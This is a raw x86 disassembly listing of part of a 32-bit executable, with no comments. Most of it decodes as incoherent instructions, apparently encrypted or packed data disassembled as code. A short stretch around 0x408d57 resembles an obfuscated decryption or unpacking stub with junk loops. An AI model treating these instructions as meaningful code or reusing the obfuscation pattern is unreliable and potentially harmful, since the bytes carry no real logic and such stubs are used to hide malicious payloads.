  4087e7:	inc    esi
  4087e8:	in     eax,0x6c
  4087ea:	adc    BYTE PTR [ebp+0x33],dh
  4087ed:	mov    dl,BYTE PTR [edx]
  4087ef:	add    DWORD PTR [eax],edi
  4087f1:	jge    0x40883b
  4087f3:	fcos   
  4087f5:	xchg   BYTE PTR [ebx],cl
  4087f7:	inc    eax
  4087f8:	loope  0x4087d5
  4087fa:	jecxz  0x408818
  4087fc:	or     al,0x49
  4087fe:	rcl    DWORD PTR [esp+ebx*2],0x99
  408802:	test   BYTE PTR [eax+0x72],bl
  408805:	xor    DWORD PTR [eax+0x41],ebx
  408808:	mov    dh,0x96
  40880a:	push   ds
  40880b:	mov    bh,BYTE PTR [eax+0x64]
  40880e:	test   BYTE PTR [eax+edi*4+0x3a],0x58
  408813:	jecxz  0x4087ba
  408815:	mov    ch,BYTE PTR [eax+0x24]
  408818:	adc    DWORD PTR [eax+0x3daabf1],edi
  40881e:	out    dx,eax
  40881f:	in     al,0xbf
  408821:	xchg   esi,eax
  408822:	inc    esp
  408823:	inc    esp
  408824:	pop    ebx
  408825:	addr16 enter 0xa372,0x89
  40882a:	pop    ebp
  40882b:	fadd   DWORD PTR [edx-0x2e]
  40882e:	dec    ecx
  40882f:	push   ds
  408830:	mov    DWORD PTR [esi],ebx
  408832:	or     esp,DWORD PTR [esi+0x45e7e146]
  408838:	lds    esp,FWORD PTR [ebp+0x64ccc897]
  40883e:	inc    edx
  40883f:	leave  
  408840:	ds je  0x40883d
  408843:	adc    BYTE PTR [eax-0x18],ah
  408846:	inc    ebx
  408847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408848:	mov    ds:0x5382fc45,al
  40884d:	daa    
  40884e:	xchg   ecx,eax
  40884f:	mov    eax,ds:0x29cc18b4
  408854:	jo     0x408880
  408856:	(bad)  
  408857:	fs inc ecx
  408859:	int3   
  40885a:	pop    ds
  40885b:	jl     0x40881f
  40885d:	add    al,0xe4
  40885f:	das    
  408860:	sub    eax,0x3f1f22d
  408865:	pslld  mm6,QWORD PTR [edi-0x506b1db5]
  40886c:	es loopne 0x4087fd
  40886f:	popa   
  408870:	fild   WORD PTR [ebp+0x44]
  408873:	cmc    
  408874:	bound  eax,QWORD PTR [esi-0x7985e4f4]
  40887a:	pop    esi
  40887b:	cwde   
  40887c:	mov    esp,DWORD PTR [ebp+0x5b]
  40887f:	repz adc DWORD PTR [esi*2+0x762899c3],edi
  408887:	jno    0x408847
  408889:	mov    BYTE PTR [ecx+0x58],dl
  40888c:	rol    BYTE PTR [eax],0x40
  40888f:	sub    BYTE PTR [esi],al
  408891:	sbb    BYTE PTR ds:0xb05a68c2,bl
  408897:	mul    DWORD PTR [ebp-0x1f]
  40889a:	dec    ecx
  40889b:	xlat   BYTE PTR ds:[ebx]
  40889c:	mov    edx,0x30997bde
  4088a1:	inc    edx
  4088a2:	(bad)  
  4088a3:	push   0x978ab4be
  4088a8:	xchg   ebx,eax
  4088a9:	or     al,0x45
  4088ab:	cmc    
  4088ac:	sahf   
  4088ad:	mov    bh,0x19
  4088af:	aam    0xdb
  4088b1:	jbe    0x4088e5
  4088b3:	int3   
  4088b4:	mov    esp,0x30378f54
  4088b9:	mov    esi,0x92cb1c11
  4088be:	pop    ebp
  4088bf:	pop    edx
  4088c0:	int3   
  4088c1:	aas    
  4088c2:	in     eax,dx
  4088c3:	(bad)
  4088c6:	jae    0x4088f9
  4088c8:	dec    edi
  4088c9:	cmp    bl,cl
  4088cb:	adc    eax,0xda8fcbe0
  4088d0:	xchg   esp,eax
  4088d1:	jmp    0xa7885133
  4088d6:	adc    bl,dh
  4088d8:	imul   edx,ebx,0x18d1ec8b
  4088de:	ret    
  4088df:	ror    BYTE PTR [ebp-0x1bae28e7],1
  4088e5:	dec    ebp
  4088e6:	std    
  4088e7:	sar    BYTE PTR [ebx+0x71],1
  4088ea:	ffreep st(6)
  4088ec:	or     al,0x24
  4088ee:	imul   edi,DWORD PTR [ecx],0x565d376a
  4088f4:	div    DWORD PTR [ebx+0x54dbd983]
  4088fa:	call   0x1a21:0xfc1b13c0
  408901:	ret    0x47e4
  408904:	or     DWORD PTR [ebx+ecx*8-0x3d2dcdbe],0xfffffffc
  40890c:	or     DWORD PTR [edx],ebp
  40890e:	in     eax,0xf
  408910:	add    al,0xd7
  408912:	xor    eax,0x32a22bcc
  408917:	mov    ebx,0xde2b2451
  40891c:	and    esp,DWORD PTR [edi]
  40891e:	mov    eax,0xc29e7e91
  408923:	mov    ds,WORD PTR [ebx+0x50f66fcc]
  408929:	(bad)  [ebp-0x6e]
  40892c:	aam    0x5d
  40892e:	dec    esp
  40892f:	or     eax,0xe55c409b
  408934:	inc    esp
  408935:	ds fwait
  408937:	mov    edi,0xe87c3032
  40893c:	xchg   ecx,eax
  40893d:	or     ah,BYTE PTR [ebp+0x13]
  408940:	and    dh,BYTE PTR [ebx]
  408942:	js     0x4088ee
  408944:	stos   DWORD PTR es:[edi],eax
  408945:	dec    eax
  408946:	ss sahf 
  408948:	in     eax,dx
  408949:	mov    al,0xf4
  40894b:	repz mov esi,0xf4bcaa
  408951:	cs inc ebx
  408953:	and    al,0x4
  408955:	mov    edx,DWORD PTR [ecx+0x5c]
  408958:	arpl   WORD PTR [ebx],si
  40895a:	cmc    
  40895b:	pop    esi
  40895c:	(bad)  
  40895e:	pop    ss
  40895f:	push   ss
  408960:	cs mov cl,0x30
  408963:	jnp    0x408918
  408965:	js     0x4089d5
  408967:	push   ds
  408968:	add    BYTE PTR [ebp-0x7f],cl
  40896b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40896c:	mov    cl,0xa7
  40896e:	mov    bh,0xc2
  408970:	loopne 0x4089ce
  408972:	mov    edi,0x5179b3a4
  408977:	xor    DWORD PTR [esi-0xf9c9721],0x20
  40897e:	inc    edi
  40897f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408980:	je     0x40892a
  408982:	xchg   ecx,eax
  408983:	scas   eax,DWORD PTR es:[edi]
  408984:	or     BYTE PTR [ecx+0x5ac90b12],ah
  40898a:	add    BYTE PTR [ebx],ah
  40898c:	into   
  40898d:	inc    ecx
  40898e:	push   0xd030fea8
  408993:	or     ebp,DWORD PTR [ebx+0x9dbc3b2]
  408999:	pusha  
  40899a:	cmp    ebp,DWORD PTR [esi-0x69]
  40899d:	cmp    DWORD PTR [esi+ecx*1-0x36],esi
  4089a1:	pop    ebp
  4089a2:	jb     0x408a1c
  4089a4:	retf   0xfc07
  4089a7:	add    eax,DWORD PTR [edx-0x79]
  4089aa:	test   al,bh
  4089ac:	lods   eax,DWORD PTR ds:[esi]
  4089ad:	js     0x4089f4
  4089af:	pop    es
  4089b0:	xor    eax,0x1057a5cc
  4089b5:	xor    BYTE PTR [ebx],ah
  4089b7:	cmc    
  4089b8:	add    ah,BYTE PTR [edx]
  4089ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089bb:	das    
  4089bc:	shl    BYTE PTR [edi+0x4],cl
  4089bf:	cli    
  4089c0:	cs or  al,0x44
  4089c3:	(bad)  
  4089c4:	call   0x4ba1:0xd311f1b4
  4089cb:	push   ss
  4089cc:	cmp    ah,dl
  4089ce:	mov    dl,0xb
  4089d0:	out    dx,eax
  4089d1:	mov    ebx,DWORD PTR [esi+0x6c]
  4089d4:	adc    DWORD PTR [ebp+0x3ce3745c],esp
  4089da:	pop    ebp
  4089db:	jns    0x4089e0
  4089dd:	out    dx,eax
  4089de:	out    dx,al
  4089df:	cwde   
  4089e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089e1:	and    ecx,DWORD PTR [esi-0x31]
  4089e4:	rcr    BYTE PTR [esi-0x17],cl
  4089e7:	lods   eax,DWORD PTR ds:[esi]
  4089e8:	out    dx,al
  4089e9:	fadd   QWORD PTR [ebx+esi*8+0xb7dfcc3]
  4089f0:	retf   0x9de6
  4089f3:	fiadd  WORD PTR [ebp-0x6a007582]
  4089f9:	sbb    ecx,DWORD PTR [edi+0x7c]
  4089fc:	pop    eax
  4089fd:	dec    esp
  4089fe:	or     DWORD PTR [ecx],0xc5cdbd35
  408a04:	lea    esi,[ecx-0x66e1b51e]
  408a0a:	out    dx,al
  408a0b:	addr16 stc 
  408a0d:	inc    esp
  408a0e:	sub    bl,al
  408a10:	xor    eax,0x98ba039e
  408a15:	retf   
  408a16:	sub    ah,BYTE PTR [ebp+ebp*4-0x28bf1568]
  408a1d:	int3   
  408a1e:	js     0x408a60
  408a20:	xor    al,0xbd
  408a22:	out    0x19,eax
  408a24:	shr    eax,cl
  408a26:	adc    al,0x21
  408a28:	push   ss
  408a29:	dec    ecx
  408a2a:	fidiv  DWORD PTR [edi]
  408a2c:	mov    edi,0x62cbac4d
  408a31:	pop    eax
  408a32:	add    edi,DWORD PTR [eax+0x68]
  408a35:	sbb    dh,0xb6
  408a38:	repz inc ebx
  408a3a:	hlt    
  408a3b:	cmp    edi,DWORD PTR [eax+edx*1]
  408a3e:	rcl    DWORD PTR [edx],cl
  408a40:	popf   
  408a41:	mov    ds:0xebd48396,al
  408a46:	jmp    0x408a25
  408a48:	jle    0x408ac9
  408a4a:	nop
  408a4b:	cwde   
  408a4c:	jne    0x408a1f
  408a4e:	pop    edx
  408a4f:	ss adc eax,0xb72d583d
  408a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a56:	and    al,0x10
  408a58:	rcr    DWORD PTR [ecx+0x1825511e],0x54
  408a5f:	xchg   edx,eax
  408a60:	jl     0x408a25
  408a62:	mov    WORD PTR [esi],es
  408a64:	add    ebp,ebp
  408a66:	inc    ebp
  408a67:	and    eax,0x589a9a44
  408a6c:	stos   BYTE PTR es:[edi],al
  408a6d:	cld    
  408a6e:	loope  0x4089f9
  408a70:	add    DWORD PTR [esi-0x37],ebx
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x33b3a4f9
  408a92:	jmp    0x408a8e
  408a94:	mov    ?,WORD PTR [eax]
  408a96:	in     al,0x78
  408a98:	js     0x408a41
  408a9a:	jle    0x408b14
  408a9c:	js     0x408aa7
  408a9e:	add    ecx,esi
  408aa0:	mov    cl,0x92
  408aa2:	dec    edx
  408aa3:	mov    ch,0x88
  408aa5:	mov    ah,0xd4
  408aa7:	mov    dh,0x9c
  408aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aaa:	div    dh
  408aac:	js     0x408aab
  408aae:	stc    
  408aaf:	and    al,0x10
  408ab1:	cwde   
  408ab2:	les    ecx,FWORD PTR [edx-0x64a369e5]
  408ab8:	push   cs
  408ab9:	das    
  408aba:	pop    ds
  408abb:	dec    ebx
  408abc:	sbb    al,0xe8
  408abe:	stos   BYTE PTR es:[edi],al
  408abf:	cmp    cl,dl
  408ac1:	ret    0xa32c
  408ac4:	push   esp
  408ac5:	jmp    0xe097:0xa16c3f8b
  408acc:	inc    ebp
  408acd:	dec    edx
  408ace:	inc    BYTE PTR [ebx]
  408ad0:	hlt    
  408ad1:	cli    
  408ad2:	(bad)  
  408ad3:	sti    
  408ad4:	cmp    ebx,esi
  408ad6:	loop   0x408b2b
  408ad8:	loope  0x408acd
  408ada:	lahf   
  408adb:	jb     0x408a81
  408add:	xor    al,0x95
  408adf:	out    dx,eax
  408ae0:	mov    cl,BYTE PTR [eax-0x1f]
  408ae3:	and    ecx,ecx
  408ae5:	dec    esp
  408ae6:	pop    ecx
  408ae7:	mov    ch,ch
  408ae9:	retf   
  408aea:	mov    DWORD PTR [edi+0x6e],edx
  408aed:	mov    DWORD PTR [ecx+ebp*4-0x404cc4d1],esi
  408af4:	lods   eax,DWORD PTR ds:[esi]
  408af5:	iret   
  408af6:	(bad)
  408af9:	push   esi
  408afa:	(bad)  
  408afb:	lock mov ds:0x6b7a28b0,al
  408b01:	sub    eax,0xebca74ee
  408b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b07:	retf   
  408b08:	int    0x37
  408b0a:	es sub ah,dl
  408b0d:	jle    0x408b28
  408b0f:	mov    cl,0xbe
  408b11:	xchg   ebp,eax
  408b12:	push   0xa
  408b14:	inc    esp
  408b15:	dec    esp
  408b16:	jl     0x408af2
  408b18:	pop    edi
  408b19:	mov    edi,ebp
  408b1b:	ds mov edi,0x7a8e5df1
  408b21:	dec    esp
  408b22:	jb     0x408b58
  408b24:	mov    eax,0x7a2bff43
  408b29:	add    DWORD PTR [ebx+0x46],ebp
  408b2c:	mov    ebp,0x4261e621
  408b31:	test   BYTE PTR fs:[ecx-0x79],0x87
  408b36:	mov    ebp,0xece23abb
  408b3b:	mov    ebx,0xda7c6d50
  408b40:	inc    ebx
  408b41:	jle    0x408b80
  408b43:	inc    esi
  408b44:	adc    ah,al
  408b46:	xchg   DWORD PTR [edx+edi*4],edi
  408b49:	mov    esp,0x24dcb319
  408b4e:	lahf   
  408b4f:	inc    eax
  408b50:	adc    DWORD PTR cs:[edi-0x25],esi
  408b54:	test   eax,0x335c2d27
  408b59:	(bad)  
  408b5a:	aad    0x36
  408b5c:	jge    0x408b4e
  408b5e:	push   ds
  408b5f:	hlt    
  408b60:	fistp  WORD PTR [ecx-0x78]
  408b63:	cdq    
  408b64:	xchg   ebp,eax
  408b65:	std    
  408b66:	test   al,0xc9
  408b68:	inc    ebp
  408b69:	xchg   edx,eax
  408b6a:	dec    esi
  408b6b:	dec    ecx
  408b6c:	dec    esp
  408b6d:	mov    BYTE PTR [esi+ecx*2],al
  408b70:	es jmp 0x767fb14c
  408b76:	ror    BYTE PTR [esi],cl
  408b78:	mov    al,al
  408b7a:	in     al,0xc8
  408b7c:	gs cmp eax,0x8655c9cc
  408b82:	ret    0xdfa8
  408b85:	repnz mov cl,0x76
  408b88:	sub    ah,BYTE PTR [ebp-0xbc5ff9b]
  408b8e:	or     eax,0x410ba89e
  408b93:	push   edx
  408b94:	aad    0x18
  408b96:	jmp    0x408c15
  408b98:	mov    bl,0x3c
  408b9a:	pop    ds
  408b9b:	call   0xbdc5e4e1
  408ba0:	or     BYTE PTR [ecx],bh
  408ba2:	dec    edi
  408ba3:	sub    edi,edx
  408ba5:	(bad)  
  408ba6:	ins    DWORD PTR es:[edi],dx
  408ba7:	loop   0x408c05
  408ba9:	mov    eax,0xb8d7784c
  408bae:	outs   dx,DWORD PTR ds:[esi]
  408baf:	mov    dl,0x1b
  408bb1:	push   edi
  408bb2:	sti    
  408bb3:	xchg   DWORD PTR [esi-0x30],esp
  408bb6:	jne    0x408b5b
  408bb8:	mov    ecx,0x3ebace71
  408bbd:	xchg   esi,eax
  408bbe:	gs mov fs,ebx
  408bc1:	push   0xffffffa1
  408bc3:	dec    eax
  408bc4:	pmulhw mm0,QWORD PTR [esi-0x14814114]
  408bcb:	repz xchg edx,eax
  408bcd:	mov    ecx,0x458d3438
  408bd2:	cli    
  408bd3:	pusha  
  408bd4:	lea    ebp,[esi-0x5a]
  408bd7:	mov    dl,0xea
  408bd9:	sub    ecx,DWORD PTR [edx+0x6a]
  408bdc:	adc    al,0x96
  408bde:	pop    ss
  408bdf:	in     eax,0x6a
  408be1:	push   0x50
  408be3:	ror    BYTE PTR [edi+0x125d8461],1
  408be9:	fwait
  408bea:	xlat   BYTE PTR fs:[ebx]
  408bec:	and    eax,0xd1afd2
  408bf1:	rcr    bh,0x10
  408bf4:	cmp    BYTE PTR [esi],bh
  408bf6:	mov    cs,WORD PTR [eax+0x24fb7c85]
  408bfc:	mov    cl,0x32
  408bfe:	lods   al,BYTE PTR ds:[esi]
  408bff:	and    BYTE PTR [ecx+eiz*4],bl
  408c02:	push   ecx
  408c03:	out    0x52,eax
  408c05:	xchg   esi,eax
  408c06:	lds    edx,FWORD PTR [esi+edi*1-0xc]
  408c0a:	add    ch,BYTE PTR [eax+0x47526cf9]
  408c10:	out    dx,eax
  408c11:	fcomp  QWORD PTR [ebx]
  408c13:	jo     0x408c09
  408c15:	pop    eax
  408c16:	pop    ds
  408c17:	sub    ch,0xe3
  408c1a:	(bad)  
  408c1e:	cwde   
  408c1f:	jne    0x408bfb
  408c21:	call   0x6f85e4d4
  408c26:	sbb    ch,0xaf
  408c29:	jl     0x408bdd
  408c2b:	adc    al,0x2a
  408c2d:	and    edx,DWORD PTR [edx+0x7ef30d89]
  408c33:	or     dh,BYTE PTR [esi-0x4c]
  408c36:	retf   
  408c37:	mov    ch,BYTE PTR [ebx+0x4169e0de]
  408c3d:	cmp    cl,BYTE PTR [ebx]
  408c3f:	lock xor BYTE PTR [esi-0x1b7e9660],ah
  408c46:	xchg   esp,eax
  408c47:	ins    BYTE PTR es:[edi],dx
  408c48:	imul   DWORD PTR [esi-0x75bcc320]
  408c4e:	push   ebp
  408c4f:	fwait
  408c50:	inc    eax
  408c51:	push   edx
  408c52:	ror    dh,1
  408c54:	cmp    esi,DWORD PTR [edx+0x36]
  408c57:	fisttp DWORD PTR [esp+esi*8-0x3e]
  408c5b:	inc    esp
  408c5c:	pop    eax
  408c5d:	sub    BYTE PTR [ebp-0x8904044],ch
  408c63:	icebp  
  408c64:	dec    si
  408c66:	fidiv  WORD PTR [esi+eiz*8+0x26]
  408c6a:	in     eax,dx
  408c6b:	call   DWORD PTR [ecx-0x64]
  408c6e:	cs (bad) 
  408c71:	ins    BYTE PTR es:[edi],dx
  408c72:	mov    edx,0x23ab455d
  408c77:	sbb    al,BYTE PTR [ebp+0x30a6fcad]
  408c7d:	dec    edi
  408c7e:	adc    BYTE PTR [ebp-0x398fc0f8],ch
  408c84:	clc    
  408c85:	or     BYTE PTR [esi],bh
  408c87:	nop
  408c88:	ins    DWORD PTR es:[edi],dx
  408c89:	stc    
  408c8a:	pop    ds
  408c8b:	mov    BYTE PTR [edi+0x1a4b3375],bl
  408c91:	call   0x9b50:0x780831b6
  408c98:	into   
  408c99:	test   al,0xa
  408c9b:	inc    eax
  408c9c:	stc    
  408c9d:	sbb    dh,BYTE PTR [ebx+0xb5debd6]
  408ca3:	jns    0x408c74
  408ca5:	jae    0x408d0a
  408ca7:	call   0xbaab33f6
  408cac:	cli    
  408cad:	lock inc esi
  408caf:	jge    0x408d17
  408cb1:	jne    0x408d20
  408cb3:	ja     0x408c81
  408cb5:	xchg   ebx,eax
  408cb6:	mov    cl,0x9
  408cb8:	stos   DWORD PTR es:[edi],eax
  408cb9:	push   0x97dc6f22
  408cbe:	mov    ebp,0xf9d03e46
  408cc3:	sub    BYTE PTR [ebx-0x250c7a86],dh
  408cc9:	test   ah,al
  408ccb:	sub    al,0xfa
  408ccd:	scas   eax,DWORD PTR es:[edi]
  408cce:	in     al,0xb0
  408cd0:	(bad)  
  408cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd2:	(bad)  
  408cd3:	cmp    dh,BYTE PTR [esi+esi*1]
  408cd6:	ret    0x1522
  408cd9:	retf   0x42ac
  408cdc:	adc    al,0x72
  408cde:	lahf   
  408cdf:	ins    BYTE PTR es:[edi],dx
  408ce0:	mov    ds:0x999c41a,eax
  408ce5:	jo     0x408ce7
  408ce7:	mov    ds:0xb5bcfae3,al
  408cec:	mov    edi,0xf33339f1
  408cf1:	sbb    BYTE PTR [edx],al
  408cf3:	les    ecx,FWORD PTR ds:0x354b848f
  408cf9:	aad    0x4a
  408cfb:	ds sbb ecx,ebx
  408cfe:	jg     0x408d12
  408d00:	pop    esi
  408d01:	xchg   esp,eax
  408d02:	jge    0x408d65
  408d04:	sub    BYTE PTR ds:0x14aec631,bh
  408d0a:	scas   al,BYTE PTR es:[edi]
  408d0b:	es and cl,cl
  408d0e:	(bad)  
  408d0f:	push   edi
  408d10:	cmp    ah,0xb2
  408d13:	mov    ecx,0xe91c2fa3
  408d18:	imul   eax,DWORD PTR [eax+0x27c6e4f1],0xffffffc0
  408d1f:	xchg   ecx,eax
  408d20:	sbb    esi,0xffffffb4
  408d23:	pop    es
  408d24:	(bad)  
  408d25:	mov    ecx,0xbdea7cc8
  408d2a:	(bad)  
  408d2b:	mov    dl,0x6
  408d2d:	sub    BYTE PTR [ecx-0x548c29ff],al
  408d33:	je     0x408d6f
  408d35:	mov    eax,ds:0x510d53dc
  408d3a:	push   esp
  408d3b:	and    eax,0x560d3c55
  408d40:	into   
  408d41:	sbb    DWORD PTR gs:[eax+0x45c7e40d],esi
  408d48:	clc    
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0x13
  408e1d:	sub    al,dl
  408e1f:	xchg   DWORD PTR [edi-0x16],esp
  408e22:	js     0x408e9c
  408e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e25:	jle    0x408e9f
  408e27:	js     0x408ddd
  408e29:	out    0x5c,al
  408e2b:	and    eax,DWORD PTR [edi+0x34]
  408e2e:	inc    esp
  408e2f:	xchg   esi,eax
  408e30:	(bad)  
  408e31:	mov    WORD PTR [esi-0x72d01f8c],ds
  408e37:	or     DWORD PTR [esi+0x59],eax
  408e3a:	jmp    0x408e09
  408e3c:	sub    ebx,DWORD PTR [eax]
  408e3e:	pop    edx
  408e3f:	sub    DWORD PTR [esi],eax
  408e41:	xchg   DWORD PTR [ebp-0x356fe8b2],edx
  408e47:	push   0x48
  408e49:	sbb    BYTE PTR [esi],al
  408e4b:	dec    edx
  408e4c:	xor    bl,BYTE PTR [esp+ecx*2+0x67]
  408e50:	add    dh,BYTE PTR [edi-0x15]
  408e53:	mov    ebp,DWORD PTR [edx-0x43]
  408e56:	cld    
  408e57:	add    al,0x64
  408e59:	and    BYTE PTR [ecx-0x20ce3f21],ah
  408e5f:	mov    eax,ds:0x7aeb440c
  408e64:	aas    
  408e65:	pop    es
  408e66:	mov    bl,0x26
  408e68:	cmp    al,0xc2
  408e6a:	in     al,dx
  408e6b:	int3   
  408e6c:	adc    DWORD PTR [edi-0x14],edx
  408e6f:	aad    0x8b
  408e71:	retf   
  408e72:	test   al,0xa9
  408e74:	ss push 0x63d7c5d5
  408e7a:	push   cs
  408e7b:	loopne 0x408e29
  408e7d:	or     al,0x56
  408e7f:	pop    edi
  408e80:	bound  edx,QWORD PTR [edx]
  408e82:	in     eax,dx
  408e83:	dec    ebx
  408e84:	dec    ebp
  408e85:	add    esp,ebp
  408e87:	xor    DWORD PTR [esi],ebp
  408e89:	mov    edi,0x156411bb
  408e8e:	jge    0x408e71
  408e90:	and    DWORD PTR [ebp-0x7914dc97],0xdc11ea91
  408e9a:	rcl    DWORD PTR [edx+0x4e5dc5ad],cl
  408ea0:	mov    ebp,0x8562b6db
  408ea5:	add    al,0x6f
  408ea7:	adc    al,0x0
  408ea9:	cmp    ebp,DWORD PTR [ebx-0x37]
  408eac:	shl    BYTE PTR [edx],1
  408eae:	fisttp QWORD PTR [ecx+0x7d055613]
  408eb4:	ss mov cl,0xf7
  408eb7:	push   ds
  408eb8:	lods   eax,DWORD PTR ds:[esi]
  408eb9:	lods   al,BYTE PTR ds:[esi]
  408eba:	xor    eax,ebx
  408ebc:	or     BYTE PTR [ecx-0x7844cf21],dl
  408ec2:	icebp  
  408ec3:	sub    eax,0x1e29f156
  408ec8:	mov    ebp,0x2f096632
  408ecd:	dec    ebp
  408ece:	adc    eax,DWORD PTR [edx+0x534b0fb3]
  408ed4:	push   ebp
  408ed5:	push   0x1e
  408ed7:	repnz cmc 
  408ed9:	xor    eax,0xc0220d3c
  408ede:	adc    al,BYTE PTR [ecx-0x6d]
  408ee1:	cmp    ecx,DWORD PTR [ebp+0x24]
  408ee4:	xchg   esi,eax
  408ee5:	jmp    0x408e75
  408ee7:	ret    
  408ee8:	xchg   edi,eax
  408ee9:	daa    
  408eea:	cdq    
  408eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eec:	repnz enter 0x49fb,0x94
  408ef1:	push   esp
  408ef2:	test   ch,bh
  408ef4:	add    eax,0xc1389248
  408ef9:	loope  0x408e9a
  408efb:	push   0xd5d25812
  408f00:	je     0x408edb
  408f02:	jmp    0xf682:0xd37044c
  408f09:	das    
  408f0a:	jns    0x408f7c
  408f0c:	sahf   
  408f0d:	fs mov al,0xc8
  408f10:	xchg   BYTE PTR [ebp-0x21],al
  408f13:	ret    0x3e22
  408f16:	sbb    cl,BYTE PTR [ebp-0x39]
  408f19:	push   edx
  408f1a:	or     DWORD PTR [edx+eax*8],esi
  408f1d:	out    dx,eax
  408f1e:	cmp    edx,DWORD PTR [ebp+0x47ea7b77]
  408f24:	(bad)  
  408f25:	out    dx,al
  408f26:	ret    
  408f27:	adc    al,0x71
  408f29:	xchg   ebp,eax
  408f2a:	ror    DWORD PTR [eax],1
  408f2c:	bound  eax,QWORD PTR [edx+0x20]
  408f2f:	pandn  mm3,mm2
  408f32:	cmp    ecx,DWORD PTR [esi+0x74]
  408f35:	inc    ebp
  408f36:	ret    
  408f37:	jl     0x408f1c
  408f39:	sbb    eax,0xe1b13e97
  408f3e:	cli    
  408f3f:	jne    0x408fbf
  408f41:	mov    esi,0x77ff3fa3
  408f46:	out    dx,eax
  408f47:	cwde   
  408f48:	jmp    0x408eca
  408f4a:	inc    ebp
  408f4b:	push   0x58033abd
  408f50:	retf   
  408f51:	stos   BYTE PTR es:[edi],al
  408f52:	dec    edi
  408f53:	push   ss
  408f54:	shl    DWORD PTR [ecx],0xff
  408f57:	loop   0x408fb5
  408f59:	leave  
  408f5a:	add    DWORD PTR [eax-0x7df2c274],eax
  408f60:	inc    ebp
  408f61:	popf   
  408f62:	cli    
  408f63:	(bad)  
  408f65:	jmp    FWORD PTR [eax]
  408f67:	adc    ecx,eax
  408f69:	test   eax,0x7dea7d92
  408f6e:	cli    
  408f6f:	mov    dl,0x3c
  408f71:	repnz mov dl,0x69
  408f74:	cmp    ebp,DWORD PTR [esi-0x22]
  408f77:	push   DWORD PTR ds:0x868ea65e
  408f7d:	jmp    0xce9c989c
  408f82:	out    dx,al
  408f83:	dec    esi
  408f84:	mov    WORD PTR [eax-0x4604d3ae],?
  408f8a:	ins    DWORD PTR es:[edi],dx
  408f8b:	mov    eax,0xa4aec6f6
  408f90:	jp     0x408f2c
  408f92:	fstp   DWORD PTR [ebx+ecx*4-0x4ec7577b]
  408f99:	sahf   
  408f9a:	das    
  408f9b:	(bad)  
  408f9c:	repz jmp 0x5d0:0xb0ea51d3
  408fa4:	ret    
  408fa5:	sbb    DWORD PTR [ebx-0x39f6c0ad],ecx
  408fab:	pushf  
  408fac:	ds or  al,0x51
  408faf:	in     eax,dx
  408fb0:	xchg   ebp,eax
  408fb1:	jp     0x409007
  408fb3:	int3   
  408fb4:	xchg   ecx,eax
  408fb5:	mov    ch,0x77
  408fb7:	jo     0x40902e
  408fb9:	das    
  408fba:	xor    BYTE PTR [esi],dl
  408fbc:	imul   eax,DWORD PTR [edi-0x5a],0x84e050a5
  408fc3:	sub    eax,0x492b5640
  408fc8:	push   cs
  408fc9:	repz xchg esp,eax
  408fcb:	mov    bl,0x3c
  408fcd:	push   ebx
  408fce:	mov    cl,0xaf
  408fd0:	fiadd  DWORD PTR [edi+0x3c817784]
  408fd6:	cwde   
  408fd7:	loopne 0x40904e
  408fd9:	cmp    eax,DWORD PTR [edx+eiz*4]
  408fdc:	scas   eax,DWORD PTR es:[edi]
  408fdd:	ins    BYTE PTR es:[edi],dx
  408fde:	cmp    edx,DWORD PTR [edi+0x21c19ae0]
  408fe4:	jo     0x408f6c
  408fe6:	aas    
  408fe7:	mul    DWORD PTR [edi]
  408fe9:	fcmovnb st,st(7)
